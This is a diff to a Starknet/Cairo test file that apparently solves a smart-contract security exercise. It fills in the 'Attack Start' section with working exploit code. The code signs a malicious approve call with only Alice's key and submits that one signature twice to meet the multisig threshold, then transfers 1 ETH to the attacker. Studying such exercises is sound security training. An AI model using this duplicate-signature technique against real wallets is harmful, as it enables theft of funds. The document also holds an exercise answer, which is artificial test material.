@@ -1,10 +1,10 @@
-use core::hash::{HashStateExTrait, HashStateTrait};
+use core::hash::{HashStateTrait};
 use core::pedersen::PedersenTrait;
 use merkle_multisig_attack::multisig_threshold_attack::multisig::{
     IMultisigDispatcher, IMultisigDispatcherTrait,
 };
 use merkle_multisig_attack::utils::helpers;
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
+use openzeppelin_token::erc20::interface::{IERC20DispatcherTrait};
 use snforge_std::signature::KeyPairTrait;
 use snforge_std::signature::stark_curve::{
     StarkCurveKeyPairImpl, StarkCurveSignerImpl, StarkCurveVerifierImpl,
@@ -14,7 +14,7 @@ use snforge_std::{
     start_cheat_signature, start_cheat_transaction_hash, stop_cheat_caller_address,
     stop_cheat_signature, stop_cheat_transaction_hash,
 };
-use starknet::{ContractAddress, account};
+use starknet::{ContractAddress, account::Call};
 
 // A struct that holds the signature of a signer
 #[derive(Copy, Drop, Serde)]
@@ -26,9 +26,10 @@ struct SignerSignature {
 
 fn deploy_multisig(
     treshold: usize, signers: Array<felt252>,
-) -> (ContractAddress, IMultisigDispatcher) {
+) -> (ContractAddress, IMultisigDispatcher) 
+{
     let contract_class = declare("Multisig").unwrap().contract_class();
-    let mut data_to_constructor = Default::default();
+    let mut data_to_constructor = array![];
     Serde::serialize(@treshold, ref data_to_constructor);
     Serde::serialize(@signers, ref data_to_constructor);
     let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
@@ -46,7 +47,7 @@ const APPROVE_FUNCTION_SELECTOR: felt252 =
     0x0219209e083275171774dab1df80982e9df2096516f06319c5c6d71ae0a8480c;
 
 #[test]
-fn test_cryptography_2() {
+fn test_threshold_attack() {
     // Accounts
     let sequencer: ContractAddress = 0.try_into().unwrap();
     let attacker: ContractAddress = 'attacker'.try_into().unwrap();
@@ -74,7 +75,7 @@ fn test_cryptography_2() {
     Serde::serialize(@ONE_ETH, ref calldata);
 
     // Prepare the call to approve the AVNU router to spend the ETH
-    let call: account::Call = account::Call {
+    let call = Call {
         to: eth_address, selector: APPROVE_FUNCTION_SELECTOR, calldata: calldata.span(),
     };
 
@@ -99,14 +100,14 @@ fn test_cryptography_2() {
     Serde::serialize(@signature_bob, ref serialized_signatures);
 
     // Prepare some Cheatcodes for the execution of the smart wallet transaction
-    // Change TX hash will be the hash we created
+    // Cheat TX hash to `hash_tx`
     start_cheat_transaction_hash(wallet_address, hash_tx);
-    // Signature will the one we created
+    // Cheat signatures to serialized_signaturess (alice and bob)
     start_cheat_signature(wallet_address, serialized_signatures.span());
     // Sender will be the sequencer (address 0)
     start_cheat_caller_address(wallet_address, sequencer);
 
-    let calls: Array<account::Call> = array![call];
+    let calls: Array<Call> = array![call];
     wallet_dispatcher.__validate__(calls.span());
     let mut _results: Array<Span<felt252>> = wallet_dispatcher.__execute__(calls.span());
 
@@ -116,8 +117,43 @@ fn test_cryptography_2() {
     stop_cheat_signature(wallet_address);
 
     // Attack Start //
-    // TODO: Given only Alice's private key, steal the 1 ETH that is in the smart wallet to the
+    // Given only Alice's private key, steal the 1 ETH that is in the smart wallet to the
     // attacker account
+
+    let mut bad_calldata: Array<felt252> = array![];
+    let attacker_felt252: felt252 = attacker.try_into().unwrap();
+    Serde::serialize(@attacker_felt252, ref bad_calldata);
+    Serde::serialize(@ONE_ETH, ref bad_calldata);
+
+    let bad_call = Call {
+        to: eth_address, selector: APPROVE_FUNCTION_SELECTOR, calldata: bad_calldata.span(),
+    };
+
+    let bad_hash_tx = hash_a_call(@bad_call);
+    let (r_alice_bad, s_alice_bad): (felt252, felt252) = alice_key_pair.sign(bad_hash_tx).unwrap();
+    let bad_signature_alice = SignerSignature {
+        signer: pubKey_alice, signature_r: r_alice_bad, signature_s: s_alice_bad,
+    };
+    let mut bad_serialized_signatures = array![];
+    Serde::serialize(@bad_signature_alice, ref bad_serialized_signatures);
+    Serde::serialize(@bad_signature_alice, ref bad_serialized_signatures);
+    
+    start_cheat_transaction_hash(wallet_address, bad_hash_tx);
+    start_cheat_signature(wallet_address, bad_serialized_signatures.span());
+    start_cheat_caller_address(wallet_address, sequencer);
+
+    let bad_calls: Array<Call> = array![bad_call];
+    wallet_dispatcher.__validate__(bad_calls.span());
+    println!("before execute");
+    let mut _results: Array<Span<felt252>> = wallet_dispatcher.__execute__(bad_calls.span());
+    println!("after execute");
+    stop_cheat_caller_address(wallet_address);
+    stop_cheat_transaction_hash(wallet_address);
+    stop_cheat_signature(wallet_address);
+
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.transfer_from(wallet_address, attacker, ONE_ETH);
+    stop_cheat_caller_address(eth_address);
 
     // Attack End //
 
@@ -128,7 +164,7 @@ fn test_cryptography_2() {
 // Create a custom tx hash for simplicity of the exercise
 // Works by serializing the call and then hashing the felt elements that represent it
 // Example taken from ???
-fn hash_a_call(call: @account::Call) -> felt252 {
+fn hash_a_call(call: @Call) -> felt252 {
     let mut serialized_call: Array<felt252> = array![];
     Serde::serialize(call, ref serialized_call);
     let first_element = serialized_call.pop_front().unwrap();
